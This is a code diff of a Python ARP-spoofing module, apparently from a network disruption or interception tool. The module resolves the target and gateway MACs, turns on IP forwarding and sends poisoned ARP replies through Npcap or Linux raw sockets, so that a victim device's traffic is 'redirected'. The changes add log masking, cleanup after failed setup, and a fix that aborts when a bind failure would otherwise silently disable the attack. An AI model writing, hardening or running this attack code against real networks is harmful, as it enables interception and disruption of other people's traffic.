@@ -62,7 +62,11 @@ from app.core.safe_subprocess import (
     SafeSubprocessError,
 )
 from app.logs.logger import log_error, log_info
-from app.utils.helpers import _NO_WINDOW  # still used by non-subprocess paths
+from app.utils.helpers import (
+    _NO_WINDOW,  # still used by non-subprocess paths
+    mask_ip,
+    mask_mac,
+)
 
 __all__ = [
     "ArpSpoofer",
@@ -302,7 +306,7 @@ def get_mac_for_ip(ip: str) -> Optional[bytes]:
             return _mac_from_arp_windows(ip)
         return _mac_from_arp_linux(ip)
     except Exception as e:
-        log_error(f"get_mac_for_ip({ip}) failed: {e}")
+        log_error(f"get_mac_for_ip({mask_ip(ip)}) failed: {e}")
         return None
 
 
@@ -363,7 +367,7 @@ def _mac_from_arp_windows(ip: str) -> Optional[bytes]:
                     if mac_str != "ff:ff:ff:ff:ff:ff":
                         return _mac_str_to_bytes(mac_str)
     except SafeSubprocessError as e:
-        log_error(f"_mac_from_arp_windows({ip}): {e}")
+        log_error(f"_mac_from_arp_windows({mask_ip(ip)}): {e}")
     return None
 
 
@@ -378,7 +382,7 @@ def _mac_from_arp_linux(ip: str) -> Optional[bytes]:
                     if mac not in ("00:00:00:00:00:00", "<incomplete>"):
                         return _mac_str_to_bytes(mac)
     except Exception as e:
-        log_error(f"_mac_from_arp_linux({ip}): {e}")
+        log_error(f"_mac_from_arp_linux({mask_ip(ip)}): {e}")
     return None
 
 
@@ -692,8 +696,9 @@ class NpcapSender:
         iface_name = self._find_interface(target_ip)
         if not iface_name:
             log_error(
-                f"Could not find Npcap interface routing to {target_ip}. "
-                f"Ensure the target is reachable and Npcap is installed."
+                f"Could not find Npcap interface routing to "
+                f"{mask_ip(target_ip)}. Ensure the target is reachable "
+                f"and Npcap is installed."
             )
             return False
 
@@ -860,7 +865,13 @@ class ArpSpoofer:
           3. Open raw socket / Npcap handle.
           4. Start the poison loop thread.
 
-        Returns True on success.
+        Returns True on success. On any failure — whether a clean
+        ``return False`` from a sub-step or an unexpected exception
+        from ctypes / Npcap / socket layer — the partial setup
+        (sender handle, IP forwarding state, Linux raw socket) is
+        torn down via :meth:`_cleanup_partial` before returning, so
+        callers that drop the spoofer reference don't leak handles
+        or leave forwarding enabled.
         """
         if self._running:
             log_info("ArpSpoofer already running")
@@ -870,98 +881,114 @@ class ArpSpoofer:
             log_error("ArpSpoofer: cannot determine default gateway")
             return False
 
-        log_info(f"ArpSpoofer: target={self.target_ip}, "
-                 f"gateway={self.gateway_ip}")
+        try:
+            log_info(f"ArpSpoofer: target={mask_ip(self.target_ip)}, "
+                     f"gateway={mask_ip(self.gateway_ip)}")
 
-        # 1. Resolve MACs
-        self._local_mac = get_local_mac(self.target_ip)
-        if not self._local_mac:
-            log_error("ArpSpoofer: cannot determine local MAC address")
-            return False
-        log_info(f"ArpSpoofer: local MAC = "
-                 f"{_mac_bytes_to_str(self._local_mac)}")
-
-        self._target_mac = get_mac_for_ip(self.target_ip)
-        if not self._target_mac:
-            log_error(f"ArpSpoofer: cannot resolve MAC for target "
-                      f"{self.target_ip} — is the device reachable?")
-            return False
-        log_info(f"ArpSpoofer: target MAC = "
-                 f"{_mac_bytes_to_str(self._target_mac)}")
-
-        self._gateway_mac = get_mac_for_ip(self.gateway_ip)
-        if not self._gateway_mac:
-            log_error(f"ArpSpoofer: cannot resolve MAC for gateway "
-                      f"{self.gateway_ip}")
-            return False
-        log_info(f"ArpSpoofer: gateway MAC = "
-                 f"{_mac_bytes_to_str(self._gateway_mac)}")
-
-        # 2. Enable IP forwarding
-        self._forwarding_was_enabled = _get_ip_forwarding_state()
-        if not self._forwarding_was_enabled:
-            if not _set_ip_forwarding(True):
-                log_error("ArpSpoofer: failed to enable IP forwarding")
+            # 1. Resolve MACs
+            self._local_mac = get_local_mac(self.target_ip)
+            if not self._local_mac:
+                log_error("ArpSpoofer: cannot determine local MAC address")
+                self._cleanup_partial()
                 return False
+            log_info(f"ArpSpoofer: local MAC = "
+                     f"{mask_mac(self._local_mac)}")
 
-        # 3. Open sender
-        if _IS_WINDOWS:
-            self._sender = NpcapSender()
-            if not self._sender.load():
-                self._restore_forwarding()
-                return False
-            if not self._sender.open(self.target_ip):
-                self._restore_forwarding()
-                return False
-        else:
-            self._linux_sock = _get_raw_socket()
-            if not self._linux_sock:
-                self._restore_forwarding()
-                return False
-            # Bind to the correct interface
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                    s.connect((self.target_ip, 80))
-                    local_ip = s.getsockname()[0]
-                import subprocess as sp
-                out = sp.check_output(
-                    ["ip", "-o", "addr", "show"], text=True, timeout=5
+            self._target_mac = get_mac_for_ip(self.target_ip)
+            if not self._target_mac:
+                log_error(
+                    f"ArpSpoofer: cannot resolve MAC for target "
+                    f"{mask_ip(self.target_ip)} — is the device reachable?"
                 )
-                iface = None
-                for line in out.splitlines():
-                    if local_ip in line:
-                        iface = line.split()[1]
-                        break
-                if iface:
-                    self._linux_sock.bind((iface, _ETH_P_ARP))
-            except Exception as e:
-                log_error(f"Linux ARP socket bind failed: {e}")
+                self._cleanup_partial()
+                return False
+            log_info(f"ArpSpoofer: target MAC = "
+                     f"{mask_mac(self._target_mac)}")
 
-        # 4. Send initial poison burst and start loop.
-        # Gratuitous ARP warmup — blast _WARMUP_ROUNDS replies at
-        # _WARMUP_INTERVAL_SEC spacing so target + gateway both
-        # overwrite their caches immediately, killing the cold-start
-        # delay where the first real packet doesn't arrive until the
-        # stale ARP entry ages out (can be 10-30s on some devices).
-        self._running = True
-        for i in range(_WARMUP_ROUNDS):
-            self._poison_once()
-            if i < _WARMUP_ROUNDS - 1:
-                time.sleep(_WARMUP_INTERVAL_SEC)
-        log_info(
-            f"ArpSpoofer: warmup burst sent "
-            f"({_WARMUP_ROUNDS} rounds @ {_WARMUP_INTERVAL_SEC}s)"
-        )
+            self._gateway_mac = get_mac_for_ip(self.gateway_ip)
+            if not self._gateway_mac:
+                log_error(
+                    f"ArpSpoofer: cannot resolve MAC for gateway "
+                    f"{mask_ip(self.gateway_ip)}"
+                )
+                self._cleanup_partial()
+                return False
+            log_info(f"ArpSpoofer: gateway MAC = "
+                     f"{mask_mac(self._gateway_mac)}")
 
-        self._thread = threading.Thread(
-            target=self._poison_loop,
-            daemon=True,
-            name="ArpSpoofer",
-        )
-        self._thread.start()
+            # 2. Enable IP forwarding
+            self._forwarding_was_enabled = _get_ip_forwarding_state()
+            if not self._forwarding_was_enabled:
+                if not _set_ip_forwarding(True):
+                    log_error("ArpSpoofer: failed to enable IP forwarding")
+                    self._cleanup_partial()
+                    return False
 
-        log_info("ArpSpoofer: ACTIVE — traffic is being redirected")
-        return True
+            # 3. Open sender
+            if _IS_WINDOWS:
+                self._sender = NpcapSender()
+                if not self._sender.load():
+                    self._cleanup_partial()
+                    return False
+                if not self._sender.open(self.target_ip):
+                    self._cleanup_partial()
+                    return False
+            else:
+                self._linux_sock = _get_raw_socket()
+                if not self._linux_sock:
+                    self._cleanup_partial()
+                    return False
+                # Bind to the correct interface. v5.7.3 (H2 fix): a bind
+                # failure used to log and silently continue, leaving an
+                # unbound raw socket whose sends were no-ops — a silent
+                # disrupt failure. Now we honestly abort.
+                if not self._bind_linux_socket():
+                    log_error(
+                        "ArpSpoofer: Linux raw socket bind failed — "
+                        "aborting (would be a silent no-op)"
+                    )
+                    self._cleanup_partial()
+                    return False
+
+            # 4. Send initial poison burst and start loop.
+            # Gratuitous ARP warmup — blast _WARMUP_ROUNDS replies at
+            # _WARMUP_INTERVAL_SEC spacing so target + gateway both
+            # overwrite their caches immediately, killing the cold-start
+            # delay where the first real packet doesn't arrive until the
+            # stale ARP entry ages out (can be 10-30s on some devices).
+            self._running = True
+            for i in range(_WARMUP_ROUNDS):
+                self._poison_once()
+                if i < _WARMUP_ROUNDS - 1:
+                    time.sleep(_WARMUP_INTERVAL_SEC)
+            log_info(
+                f"ArpSpoofer: warmup burst sent "
+                f"({_WARMUP_ROUNDS} rounds @ {_WARMUP_INTERVAL_SEC}s)"
+            )
+
+            self._thread = threading.Thread(
+                target=self._poison_loop,
+                daemon=True,
+                name="ArpSpoofer",
+            )
+            self._thread.start()
+
+            log_info("ArpSpoofer: ACTIVE — traffic is being redirected")
+            return True
+
+        except Exception as exc:
+            # H1 fix: if any sub-step raises — typically ctypes / Npcap
+            # / socket layer — release every resource we acquired before
+            # propagating the failure to the caller. Without this guard,
+            # the caller's `_arp_spoofer = None` would drop the only
+            # reference to a half-initialized spoofer whose pcap handle
+            # and IP-forwarding setting would leak until process exit.
+            log_error(
+                f"ArpSpoofer.start() raised — cleaning up partial state: "
+                f"{exc!r}"
+            )
+            self._cleanup_partial()
+            return False
 
     def stop(self) -> None:
         """Stop ARP spoofing and restore real ARP entries."""
@@ -998,13 +1025,107 @@ class ArpSpoofer:
     def is_active(self) -> bool:
         return self._running
 
-    # ── Internal ─────────────────────────────────────────────────
-
     @property
     def packets_sent(self) -> int:
         """Thread-safe read of total ARP packets sent."""
         with self._stats_lock:
             return self._packets_sent
+
+    # ── Internal ─────────────────────────────────────────────────
+
+    def _bind_linux_socket(self) -> bool:
+        """Bind ``self._linux_sock`` to the interface routing to target.
+
+        Returns True on successful bind, False on any failure (interface
+        not found, ``ip`` binary missing, ``socket.bind`` raise). Used by
+        :meth:`start` to detect the silent-no-op state where the raw
+        socket exists but isn't bound to any NIC.
+        """
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                s.connect((self.target_ip, 80))
+                local_ip = s.getsockname()[0]
+        except OSError as exc:
+            log_error(
+                f"ArpSpoofer: route-probe socket failed: {exc!r}"
+            )
+            return False
+
+        try:
+            import subprocess as sp
+            out = sp.check_output(
+                ["ip", "-o", "addr", "show"], text=True, timeout=5
+            )
+        except (FileNotFoundError, sp.SubprocessError, OSError) as exc:
+            log_error(
+                f"ArpSpoofer: `ip -o addr show` failed: {exc!r}"
+            )
+            return False
+
+        iface = None
+        for line in out.splitlines():
+            if local_ip in line:
+                iface = line.split()[1]
+                break
+
+        if not iface:
+            log_error(
+                f"ArpSpoofer: no interface found for local IP "
+                f"{mask_ip(local_ip)} — cannot bind raw socket"
+            )
+            return False
+
+        try:
+            self._linux_sock.bind((iface, _ETH_P_ARP))
+            return True
+        except OSError as exc:
+            log_error(
+                f"ArpSpoofer: bind({iface}, ETH_P_ARP) failed: {exc!r}"
+            )
+            return False
+
+    def _cleanup_partial(self) -> None:
+        """Release every resource acquired during a failed ``start()``.
+
+        H1 fix companion. Called from ``start()`` on every failure path
+        — clean ``return False`` or exception. Idempotent and exception-
+        safe: each sub-step is independently guarded so a raise in one
+        cleanup doesn't block the others.
+
+        Restores:
+          * Npcap handle (``self._sender``)
+          * Linux raw socket (``self._linux_sock``)
+          * IP forwarding state (only if start() flipped it)
+          * ``self._running = False`` so a subsequent stop() doesn't
+            misinterpret partial state as a live session.
+        """
+        # Sender
+        if self._sender is not None:
+            try:
+                self._sender.close()
+            except Exception as exc:
+                log_error(f"ArpSpoofer cleanup: sender.close raised: {exc!r}")
+            self._sender = None
+
+        # Linux raw socket
+        if self._linux_sock is not None:
+            try:
+                self._linux_sock.close()
+            except Exception as exc:
+                log_error(f"ArpSpoofer cleanup: linux_sock.close raised: {exc!r}")
+            self._linux_sock = None
+
+        # IP forwarding. _restore_forwarding only flips back to False
+        # when _forwarding_was_enabled is False — i.e. when we were the
+        # ones who turned it on. If the caller bailed before step 2,
+        # _forwarding_was_enabled is False (its __init__ default) and
+        # we'll attempt a redundant set-to-False, which is harmless.
+        try:
+            self._restore_forwarding()
+        except Exception as exc:
+            log_error(f"ArpSpoofer cleanup: _restore_forwarding raised: {exc!r}")
+
+        self._running = False
 
     def _send_frame(self, frame: bytes) -> bool:
         """Send a raw Ethernet frame through the appropriate sender."""
